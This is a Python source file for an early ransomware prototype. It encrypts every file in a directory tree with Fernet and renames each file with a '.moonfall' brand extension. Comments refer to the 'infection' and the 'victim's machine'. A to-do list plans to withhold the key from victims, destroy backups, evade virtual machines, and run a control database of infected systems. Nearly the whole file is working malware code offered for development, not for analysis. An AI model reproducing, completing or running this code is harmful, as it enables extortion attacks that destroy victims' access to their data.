import os
from cryptography.fernet import Fernet
"""
Fernet is not suitable for large files
More information here - https://cryptography.io/en/latest/fernet.html
"""
# brand_name = '.kinbaku' Option 1
# brand_name = '.shibari' Option 2
# brand_name = '.missingNo' Option 3
brand_name = '.moonfall'


extension_list = ['.pdf', '.doc', '.docx', '.xls', '.xslx', '.ppt', '.pptx', '.pages'] #COMPLETE LATER

"""
Generate the key and then load to encrypt

PROBLEM:
At the moment of the infection, we do not want to save the key on victim's machine.
We need a way to generate the key and then have the control over the key.
"""

def write_key():
	key = Fernet.generate_key()

	with open('key.key', 'wb') as key_file: 
		key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


"""
Load and save data methods

PROBLEM:
We may need to rename those encrypted files. Plus encrypting in function of the extension
is needed.
"""

def save_data(filename, data):
	with open(filename, 'wb') as file:
		file.write(data)

	file.close()

	# A little bit of branding
	os.rename(filename, filename + brand_name)

def load_data(filename):
	with open(filename, 'rb') as file:
		return file.read()


"""
Very simple encrypt function
"""
def encrypt(filename, key):
	try:
		f = Fernet(key)
		data = load_data(filename)
		encrypted_data = f.encrypt(data)
		save_data(filename, encrypted_data)
	except ValueError as va:
		print(va)

"""
Other problems here
- Destroy backup files
- Detect in which OS we're running (take Windows as main focus OS)
- Detect virtualized environment
- Provide the uninstalling program once the system is infected
- Create a database with the infected system ID and the status of the attack. Then provide a manager to control in real time
"""
if __name__ == '__main__':
	write_key()
	key = load_key()

	root = 'C:/'
	root_osx = '/Users/marcosplazagonzalez/Desktop/test'
	root_win = 'C:/Users/marco/OneDrive/Escritorio/Test'

	# ITERATE AND ENCRYPT
	for root, dirs, files in os.walk(root_win):
	   for fn in files:
	   		full_path = root + os.sep + fn
	   		encrypt(full_path, key)

	print("All data was encrypted successfully ;)")